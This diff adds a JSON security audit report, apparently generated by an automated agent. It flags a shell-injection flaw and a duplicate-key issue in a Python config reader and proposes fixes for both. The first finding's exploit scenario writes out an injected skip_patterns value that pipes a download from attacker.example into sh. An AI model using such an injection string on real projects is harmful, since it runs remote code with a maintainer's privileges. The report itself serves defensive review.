@@ -1,0 +1,25 @@
+{
+  "agent": "vibe-suite:security",
+  "findings": [
+    {
+      "file": "scripts/lib/config.py:88",
+      "observation": "The config reader interpolates a user-supplied path into a shell command without quoting.",
+      "severity": "[HIGH]",
+      "evidence": "Line 88 builds `cmd = f\"cat {path}\"` and passes it to `subprocess.run(..., shell=True)`. `path` originates from the `.vibe-suite.md` `skip_patterns` key, which is project-controlled text.",
+      "proposed_change": "Pass an argument list to subprocess.run and drop shell=True, so the path is never parsed by a shell.",
+      "tradeoff": "Callers relying on shell globbing in skip_patterns would need to expand patterns themselves before the call.",
+      "effort": "[<1 day]",
+      "exploit_scenario": "A contributor adds `skip_patterns: [\"; curl attacker.example/x | sh\"]` to a project's .vibe-suite.md. Any maintainer who then runs an audit in that checkout executes the injected command with their own privileges."
+    },
+    {
+      "file": "scripts/lib/config.py:141",
+      "observation": "Config lookup returns the first match without checking for duplicate keys, so a repeated key is silently ignored.",
+      "severity": "[MEDIUM]",
+      "evidence": "The parser builds a dict by successive assignment; a second occurrence of the same key overwrites the first with no warning.",
+      "proposed_change": "Detect repeated keys during parse and emit a warning naming the key and both line numbers.",
+      "tradeoff": "Adds a parse-time pass over the raw lines; negligible for files of this size.",
+      "effort": "[<1 day]",
+      "exploit_scenario": "A project sets the same skip_patterns key twice in .vibe-suite.md — once narrowly, once broadly. The narrow value is silently discarded, so paths the maintainer believed were excluded from audit are scanned and their contents surface in report evidence."
+    }
+  ]
+}
